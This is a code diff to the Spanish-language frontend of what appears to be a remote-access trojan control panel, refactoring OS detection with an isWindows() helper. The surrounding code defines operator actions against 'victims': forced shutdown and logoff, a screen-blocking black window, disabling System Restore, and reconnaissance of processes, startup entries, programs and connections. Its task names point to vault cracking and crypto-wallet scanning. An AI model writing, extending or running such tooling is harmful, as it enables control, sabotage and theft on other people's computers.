@@ -7,6 +7,7 @@ import {
 } from 'lucide-react';
 import type { LucideIcon } from 'lucide-react';
 import type { Victim } from '@/lib/types';
+import { isWindows } from '@/lib/os';
 
 export type TaskName =
   | 'shell' | 'file_pull' | 'crack_vault' | 'dump_vault' | 'scan_wallets'
@@ -79,7 +80,7 @@ const agent = (command: string, timeout = 60): Resolved => ({ name: 'agent', par
 const task = (name: TaskName, params: Record<string, unknown> = {}, timeout = 60): Resolved => ({ name, params, timeout });
 
 const ps = (script: string) => `powershell -NoProfile -ExecutionPolicy Bypass -Command "${script.replace(/"/g, '\\"')}"`;
-const win = (windows: string, linux: string) => (victim: Victim) => (victim.os === 'windows' ? windows : linux);
+const win = (windows: string, linux: string) => (victim: Victim) => (isWindows(victim.os) ? windows : linux);
 
 const BLANK_SCREEN = ps(
   "Add-Type -AssemblyName System.Windows.Forms;$f=New-Object System.Windows.Forms.Form;$f.BackColor='Black';$f.FormBorderStyle='None';$f.WindowState='Maximized';$f.TopMost=$true;$f.ShowDialog()"
@@ -109,13 +110,13 @@ export const ACTIONS: ActionDef[] = [
 
   // Energía
   { id: 'shutdown', group: 'energia', label: 'Apagar', icon: Power, task: 'shell', detail: win('shell · shutdown /s /t 0 /f', 'shell · systemctl poweroff'), destructive: true,
-    resolve: (victim) => shell(victim.os === 'windows' ? 'shutdown /s /t 0 /f' : 'systemctl poweroff') },
+    resolve: (victim) => shell(isWindows(victim.os) ? 'shutdown /s /t 0 /f' : 'systemctl poweroff') },
   { id: 'restart', group: 'energia', label: 'Reiniciar', icon: RefreshCw, task: 'shell', detail: win('shell · shutdown /r /t 0 /f', 'shell · systemctl reboot'), destructive: true,
-    resolve: (victim) => shell(victim.os === 'windows' ? 'shutdown /r /t 0 /f' : 'systemctl reboot') },
+    resolve: (victim) => shell(isWindows(victim.os) ? 'shutdown /r /t 0 /f' : 'systemctl reboot') },
   { id: 'logoff', group: 'energia', label: 'Cerrar sesión', icon: Ban, task: 'shell', detail: win('shell · shutdown /l /f', 'shell · loginctl terminate-user $USER'),
-    resolve: (victim) => shell(victim.os === 'windows' ? 'shutdown /l /f' : 'loginctl terminate-user $USER') },
+    resolve: (victim) => shell(isWindows(victim.os) ? 'shutdown /l /f' : 'loginctl terminate-user $USER') },
   { id: 'suspend', group: 'energia', label: 'Suspender', icon: Moon, task: 'shell', detail: win('shell · rundll32 powrprof.dll,SetSuspendState', 'shell · systemctl suspend'),
-    resolve: (victim) => shell(victim.os === 'windows' ? 'rundll32 powrprof.dll,SetSuspendState 0,1,0' : 'systemctl suspend') },
+    resolve: (victim) => shell(isWindows(victim.os) ? 'rundll32 powrprof.dll,SetSuspendState 0,1,0' : 'systemctl suspend') },
 
   // Opciones
   { id: 'blank', group: 'opciones', label: 'Pantalla en blanco', icon: Monitor, task: 'shell', detail: 'shell · formulario negro a pantalla completa', windowsOnly: true, resolve: () => shell(BLANK_SCREEN, 120, 'pantalla en blanco') },
@@ -129,10 +130,10 @@ export const ACTIONS: ActionDef[] = [
   { id: 'restore-off', group: 'opciones', label: 'Quitar restaurar sistema', icon: Archive, task: 'shell', detail: 'shell · Disable-ComputerRestore', windowsOnly: true, destructive: true, resolve: () => shell(ps('Disable-ComputerRestore -Drive $env:SystemDrive'), 60) },
 
   // Extra
-  { id: 'processes', group: 'extra', label: 'Procesos', icon: Cpu, task: 'shell', detail: win('shell · tasklist /v', 'shell · ps aux'), view: { title: 'Procesos', command: (victim) => victim.os === 'windows' ? 'tasklist /v' : 'ps aux' }, resolve: (victim) => shell(victim.os === 'windows' ? 'tasklist /v' : 'ps aux', 60) },
-  { id: 'startup', group: 'extra', label: 'Inicio automático', icon: Rocket, task: 'shell', detail: win('shell · wmic startup list full', 'shell · systemctl list-unit-files'), view: { title: 'Inicio automático', command: (victim) => victim.os === 'windows' ? 'wmic startup list full' : 'systemctl list-unit-files --state=enabled' }, resolve: (victim) => shell(victim.os === 'windows' ? 'wmic startup list full' : 'systemctl list-unit-files --state=enabled', 60) },
-  { id: 'programs', group: 'extra', label: 'Programas instalados', icon: Boxes, task: 'shell', detail: win('shell · reg query Uninstall', 'shell · dpkg -l'), view: { title: 'Programas instalados', command: (victim) => victim.os === 'windows' ? 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" /s' : 'dpkg -l' }, resolve: (victim) => shell(victim.os === 'windows' ? 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" /s' : 'dpkg -l', 90) },
-  { id: 'tcp', group: 'extra', label: 'Conexiones TCP', icon: Network, task: 'shell', detail: win('shell · netstat -ano', 'shell · ss -tunap'), view: { title: 'Conexiones TCP', command: (victim) => victim.os === 'windows' ? 'netstat -ano' : 'ss -tunap' }, resolve: (victim) => shell(victim.os === 'windows' ? 'netstat -ano' : 'ss -tunap', 60) },
+  { id: 'processes', group: 'extra', label: 'Procesos', icon: Cpu, task: 'shell', detail: win('shell · tasklist /v', 'shell · ps aux'), view: { title: 'Procesos', command: (victim) => isWindows(victim.os) ? 'tasklist /v' : 'ps aux' }, resolve: (victim) => shell(isWindows(victim.os) ? 'tasklist /v' : 'ps aux', 60) },
+  { id: 'startup', group: 'extra', label: 'Inicio automático', icon: Rocket, task: 'shell', detail: win('shell · wmic startup list full', 'shell · systemctl list-unit-files'), view: { title: 'Inicio automático', command: (victim) => isWindows(victim.os) ? 'wmic startup list full' : 'systemctl list-unit-files --state=enabled' }, resolve: (victim) => shell(isWindows(victim.os) ? 'wmic startup list full' : 'systemctl list-unit-files --state=enabled', 60) },
+  { id: 'programs', group: 'extra', label: 'Programas instalados', icon: Boxes, task: 'shell', detail: win('shell · reg query Uninstall', 'shell · dpkg -l'), view: { title: 'Programas instalados', command: (victim) => isWindows(victim.os) ? 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" /s' : 'dpkg -l' }, resolve: (victim) => shell(isWindows(victim.os) ? 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" /s' : 'dpkg -l', 90) },
+  { id: 'tcp', group: 'extra', label: 'Conexiones TCP', icon: Network, task: 'shell', detail: win('shell · netstat -ano', 'shell · ss -tunap'), view: { title: 'Conexiones TCP', command: (victim) => isWindows(victim.os) ? 'netstat -ano' : 'ss -tunap' }, resolve: (victim) => shell(isWindows(victim.os) ? 'netstat -ano' : 'ss -tunap', 60) },
   { id: 'window', group: 'extra', label: 'Ventana activa', icon: AppWindow, task: 'shell', detail: 'shell · GetForegroundWindow', windowsOnly: true, view: { title: 'Ventana activa', command: () => ACTIVE_WINDOW }, resolve: () => shell(ACTIVE_WINDOW, 30, 'ventana activa') },
   { id: 'registry', group: 'extra', label: 'Consultar registro', icon: FileText, task: 'shell', detail: 'shell · reg query', windowsOnly: true, dialog: 'shell', local: true },
   { id: 'search', group: 'extra', label: 'Buscar ficheros', icon: FileSearch, task: 'shell', detail: win('shell · where /r', 'shell · find'), dialog: 'search_files', local: true },
